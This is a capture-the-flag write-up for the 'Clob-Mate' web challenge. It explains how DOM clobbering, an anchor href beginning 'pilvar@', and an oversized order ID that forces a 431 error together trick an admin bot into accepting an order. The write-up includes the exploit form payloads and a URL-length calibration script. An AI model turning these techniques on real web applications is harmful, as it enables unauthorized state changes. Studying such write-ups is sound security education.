<hr />

<h2>description: DOM clobbering + request size denial of service</h2>

<h1>Clob-Mate</h1>

<h2>Description</h2>

<blockquote>
  <p>I heard there's a shortage of Clob-Mate, but you need your hacker fuel. You have to order some, no matter the cost.</p>
</blockquote>

<p>{% file src="../../.gitbook/assets/web-clob-mate-source.tar.gz" %}</p>

<h2>Solution</h2>

<h3>Initial Analysis</h3>

<p>This challenge gives us a simple form that when submitted, shows our "order status".</p>

<figure><img src="../../.gitbook/assets/Screenshot 2022-09-26 at 9.48.37 PM.png" alt=""><figcaption></figcaption></figure>

<p>Looking at the source code, we can see that the endpoint that creates the order takes in <code>article</code>, <code>quantity</code>, <code>username</code>, <code>address</code> and <code>email</code>, then generates an <code>order_id</code> based on the base64-encoded value of <code>article+quantity+username+address</code>.</p>

<p><code>python
@main.route('/order/create', methods=['POST'])
@limiter.limit("40/minute")
def create_order():
  try:
    article = escape(request.form.get('article'))
    quantity = escape(request.form.get('quantity'))
    username = escape(request.form.get('username'))
    if username == "pilvar":
      if not ipaddress.ip_address(request.remote_addr).is_private:
        abort(403)
    address = escape(request.form.get('address'))
    email = escape(request.form.get('email'))
    order_id = codecs.encode((article+quantity+username+address).encode('ascii'), 'base64').decode('utf-8')
    order_id = order_id.replace("\n","") #I have no ideas where it happens, but I think there's a new line appended somewhere. Putting this line here and there fixed it.
    order = Order.query.filter_by(order_id=order_id).first()
    if order:
      iteration = 0
      order_id = order.order_id
      og_order_id = order_id
      while order:
          order_id = og_order_id+"-"+str(iteration)
          order = Order.query.filter_by(order_id=order_id).first()
          iteration += 1
    status = "Under review"
    new_order = Order(order_id=order_id,
                    email=email,
                    username=username,
                    address=address,
                    article=article,
                    quantity=quantity,
                    status=status)
    db.session.add(new_order)
    db.session.commit()
    q.enqueue(visit, order_id)
    return redirect("/orders/"+order_id+"/preview")
  except Exception as e:
    return(str(e))
</code></p>

<p>This base64 value is then used in future URI paths that correspond to our order. This format of creating record IDs is a bit odd - alphanumeric IDs of a fixed length are the commonly-used format for these things, and more interestingly this format allows the user to create arbitrary-length URLs. This would come in handy later.</p>

<p>The app also exposes a <code>/orders/&lt;order_id&gt;/get_user_infos</code> API that allows us to query the <code>username</code>, <code>address</code> and <code>email</code> information of an order.&#x20;</p>

<p><code>python
@main.route('/orders/&lt;order_id&gt;/get_user_infos')
def userinfos(order_id):
    order = Order.query.filter_by(order_id=order_id).first()
    return {'username': order.username, 'address': order.address, 'email': order.email}
</code></p>

<p>The <code>/order/update</code> endpoint is where we get our flag - the admin needs to send a request that sets the <code>order_status</code> to <code>"accepted"</code>.</p>

<p><code>python
@main.route('/order/update', methods=['POST'])
def update():
    if ipaddress.ip_address(request.remote_addr).is_private:
        order_id = request.form.get('order_id')
        order_status = request.form.get('order_status')
        if order_status == "accepted":
            order_status = os.getenv('FLAG')
        Order.query.filter_by(order_id=order_id).update({
            'status': order_status
            })
        db.session.commit()
        return redirect("/")
    else:
        return redirect("/")
</code></p>

<p>The admin would visit our order preview, where the <code>inspect_order.html</code> template is rendered.</p>

<p><code>python
@main.route('/orders/&lt;order_id&gt;/preview')
def order(order_id):
    if order_id:
        order = Order.query.filter_by(order_id=order_id).first()
        if not order:
            abort(404)
        if ipaddress.ip_address(request.remote_addr).is_private:
            article_infos = order.article.split(":")
            article_name = article_infos[0]
            article_link = article_infos[1]
            return render_template('inspect_order.html', order_id=order.order_id, article_name=article_name, article_link=article_link, quantity=order.quantity)
        else:
            return render_template('order_status.html', status=order.status)
    else:
        return redirect("/")
</code></p>

<h3>DOM Clobbering</h3>

<p>Let's take a look at the preview page! Our goal here is make <code>order.user.username</code> evaluate to <code>"pilvar"</code>, so that we reach the code path where <code>/order/update</code> request is sent with <code>order_status=accepted</code>.</p>

<p>```markup</p>

<script type="text/javascript">
    //As we are getting out of stock, we decided to prioritize delivering our last Clob-Mates to real hackers. We also automated this task because it was taking a lot of time.
    order_id = "{{ order_id }}"
    fetch("get_user_infos").then(res => res.text()).then(txt => {
        try {
            user = JSON.parse(txt);
            order = { "user": {} };
            order.user = user;
            if (order.user.username == "pilvar") {
                fetch("/order/update", {
                    body: "order_id=" + order_id + "&order_status=accepted",
                    headers: {
                        "Content-Type": "application/x-www-form-urlencoded",
                    },
                    method: "post",
                })
            } else {
                fetch("/order/update", {
                    body: "order_id=" + order_id + "&order_status=rejected",
                    headers: {
                        "Content-Type": "application/x-www-form-urlencoded",
                    },
                    method: "post",
                })
            }
        }
        catch (err) {
            console.log("Couldn't send the data, trying again.");
            if (order.user.username == "pilvar") {
                fetch("/order/update", {
                    body: "order_id=" + order_id + "&order_status=accepted",
                    headers: {
                        "Content-Type": "application/x-www-form-urlencoded",
                    },
                    method: "post",
                })
            } else {
                fetch("/order/update", {
                    body: "order_id=" + order_id + "&order_status=rejected",
                    headers: {
                        "Content-Type": "application/x-www-form-urlencoded",
                    },
                    method: "post",
                })
            }
        }
    })
</script>

<p>```</p>

<p>Quite interestingly, the <code>fetch("/order/update")</code> call is performed again if an exception is raised in the <code>try</code> block.&#x20;</p>

<p>Note that none of the variables are declared with the <code>var</code> or <code>let</code> keywords, making all of them <a href="https://www.w3schools.com/js/js_scope.asp">global variables</a>. Because in HTML the global scope is the <code>window</code> object, one effect of this is that if any of the HTML elements have their <code>id</code> set to <code>order</code>, the global variable <code>order</code> (<code>window.order</code>) would refer to that element!</p>

<p>This is known as <a href="https://portswigger.net/web-security/dom-based/dom-clobbering">DOM clobbering</a>, a technique hinted by the challenge name.</p>

<p><code>markup
&lt;body&gt;
    &lt;p id="order" name="{{ order_id }}"&gt;&lt;b&gt;Order ID: &lt;/b&gt;{{ order_id }}&lt;/p&gt;
    &lt;p&gt;&lt;b&gt;Article:&lt;/b&gt; &lt;a id="order" name="{{ article_name }}" href="/{{ article_link }}"&gt;{{ article_name }}&lt;/a&gt;&lt;/p&gt;
    &lt;p id="order" name="{{ quantity }}"&gt;&lt;b&gt;Quantity: &lt;/b&gt;{{ quantity }}&lt;/p&gt;
&lt;/body&gt;
</code></p>

<p>Because the bottom of the page contains elements with their <code>id</code>s set to <code>order</code>, the original value of <code>order</code> is a <code>HTMLCollection</code> object containing these elements.</p>

<p>But since <code>order</code> is being set in the <code>try</code> block, this vulnerability can only happen if we trigger an exception at the <code>JSON.parse</code> line <em>before</em> the <code>order</code> variable is changed.</p>

<p>```javascript
try {
    user = JSON.parse(txt);
    order = { "user": {} };
    order.user = user;</p>

<pre><code>...
</code></pre>

<p>```</p>

<p>At this point we don't yet know how to trigger the exception, but let's first try and see if our hypothesis works. We could test this by adding a <code>throw</code> statement before <code>order</code> is changed.</p>

<p><code>javascript
try {
    user = JSON.parse(txt);
    throw "";
    order = { "user": {} };
    order.user = user;
</code></p>

<p>The <code>order</code> variable is indeed a <code>HTMLCollection</code>!</p>

<figure><img src="../../.gitbook/assets/Screenshot 2022-09-26 at 10.53.51 PM.png" alt=""><figcaption></figcaption></figure>

<p>Recall that our goal is to set <code>order.user.username</code>. To control <code>order.user</code>, we could use the <code>name</code> attribute that is set on the anchor and paragraph tags.&#x20;</p>

<p>Right now, our form body looks like this:</p>

<p><code>
username=x&amp;email=x&amp;address=1&amp;quantity=user&amp;article=user:x
</code></p>

<p>which sets the following body:</p>

<p><code>markup
&lt;body&gt;
    &lt;p id="order" name="dXNlcjp4dXNlcngx"&gt;&lt;b&gt;Order ID: &lt;/b&gt;dXNlcjp4dXNlcngx&lt;/p&gt;
    &lt;p&gt;&lt;b&gt;Article:&lt;/b&gt; &lt;a id="order" name="user" href="/x"&gt;user&lt;/a&gt;&lt;/p&gt;
    &lt;p id="order" name="user"&gt;&lt;b&gt;Quantity: &lt;/b&gt;user&lt;/p&gt;
&lt;/body&gt;
</code></p>

<p>Now <code>order.user</code> would return the anchor tag element. Great!</p>

<figure><img src="../../.gitbook/assets/Screenshot 2022-09-26 at 10.57.57 PM.png" alt=""><figcaption></figcaption></figure>

<p>Curiously though, <code>order.user.username</code> is an empty string, instead of <code>undefined</code>.</p>

<figure><img src="../../.gitbook/assets/Screenshot 2022-09-26 at 11.00.04 PM.png" alt=""><figcaption></figcaption></figure>

<p>This was strange indeed! The <code>username</code> property is in fact part of the anchor tag element object's prototype.</p>

<figure><img src="../../.gitbook/assets/Screenshot 2022-09-26 at 11.01.46 PM.png" alt=""><figcaption></figcaption></figure>

<p>It turns out that the anchor tag's username property actually refers to the username part of the <code>href</code> value (see <a href="https://www.w3schools.com/jsref/prop_anchor_username.asp">this</a>). This meant that in order to set <code>order.user.username</code> to <code>pilvar</code>, all we had to do was to supply a URL starting with <code>pilvar@</code> to the <code>href</code> attribute.</p>

<p><code>
username=x&amp;email=x&amp;address=1&amp;quantity=user&amp;article=user:/pilvar@x.com
</code></p>

<h3>Triggering the Exception</h3>

<p>Now comes the tricky part - how do we trigger the exception in the first place?</p>

<p>My first thought was to look for interoperability issues between Flask's JSON response and JavaScript's <code>JSON.parse</code>. I tried things like weird unicode characters and JSON comments, but nothing worked. One nap later I convinced myself that both Flask and JavaScript are probably spec-compliant when handling JSON, and I was probably not intended to find a JSON parsing 0-day.</p>

<p>If JSON parsing is out of the question, then the only way to cause an exception here is to make the <code>/order/&lt;order_id&gt;/get_user_infos</code> endpoint return something that is <em>not</em> JSON in the first place! Going back to the <code>/order/create</code> endpoint, I started to question the weird <code>order_id</code> format.</p>

<p><code>python
order_id = codecs.encode((article+quantity+username+address).encode('ascii'), 'base64').decode('utf-8')
order_id = order_id.replace("\n","")
</code></p>

<p>We know that the user can create arbitrary-length order IDs, and we need <code>get_user_infos</code> to somehow fail. Since the <code>/order/&lt;order_id&gt;/preview</code> URL is 7 bytes shorter than the <code>/order/&lt;order_id&gt;/get_user_infos</code> one, there is a 7-byte window where <code>preview</code> would succeed but <code>get_user_infos</code> will fail due to URL length limits enforced by the web server. This is a known technique that in some cases can be helpful in performing XS-Leaks.</p>

<p>In the case of Waitress, the 431 Request Header Fields Too Large response code is returned.</p>

<p>```http
HTTP/1.0 431 Request Header Fields Too Large
Connection: close
Content-Length: 90
Content-Type: text/plain
Date: Sun, 25 Sep 2022 07:58:27 GMT
Server: waitress</p>

<p>Request Header Fields Too Large</p>

<p>exceeds max_header of 262144</p>

<p>(generated by waitress)
```</p>

<p>Using this script to binary search for the longest URL we could get before the error occurs, I got an approximate length for the <code>order_id</code> to trigger this exploit.</p>

<p>```javascript
let URL_LIMIT = 1000000</p>

<p>const checkLoad = async (url) =&gt; {
    let res = await fetch(url)
    return res.ok
}</p>

<p>const genUrl = (url, n) =&gt; {
    let seperator = url.includes('?') ? '&amp;foo=' : '?foo='
    let endMarker = 'END'
    let l  = n - url.length - seperator.length - endMarker.length
    let newUrl = url + seperator + 'a'.repeat(l) + endMarker
    if(newUrl.length !== n){
        console.debug(<code>[!] ${newUrl.length} !== ${n}</code>)
    }
    return newUrl</p>

<p>}</p>

<p>const calibrate = async (url) =&gt;  {
    let l = 0, r = URL_LIMIT, m = 0, res = false
    while (l &lt; r) {
        m = Math.floor((l + r) / 2)
        res = await checkLoad(genUrl(url, m))
        console.log(res, m)
        if(res === false){
            r = m - 1
        }
        else{
            l = m + 1
        }</p>

<pre><code>}
// check it again
res = await checkLoad(genUrl(url, l))
if(res === false){
    l--
}
res = await checkLoad(genUrl(url, l))
if(res === false){
    console.debug('Error after last check !!!')
    return 0
}
console.debug(`DONE: length: ${l}, result: ${res}`)
return l
</code></pre>

<p>}</p>

<p>calibrate("http://localhost:1337")
```</p>

<p>The next step is to take our current payload, and pad any of the fields (except for <code>article</code>) with enough bytes to get the corresponding <code>order_id</code> length.</p>

<figure><img src="../../.gitbook/assets/Screenshot 2022-09-25 at 4.35.54 PM.png" alt=""><figcaption></figcaption></figure>

<p>A few moments later the admin visits our preview page and gets the flag!</p>

<figure><img src="../../.gitbook/assets/Screenshot 2022-09-25 at 4.35.27 PM.png" alt=""><figcaption></figcaption></figure>

<p>While this method used the 7-byte difference between the two URLs to calculate the <code>order_id</code> length, the exploit is actually made much simpler by the fact that the <code>Referer</code> header is sent on the second request containing the order URL (I only noticed this after the competition).</p>

<p>Because the error is caused by the total length of the request line + headers, the long <code>Referer</code> header meant that the precision of calculating the required <code>order_id</code> length was not that important and a large range of lengths would have worked.</p>
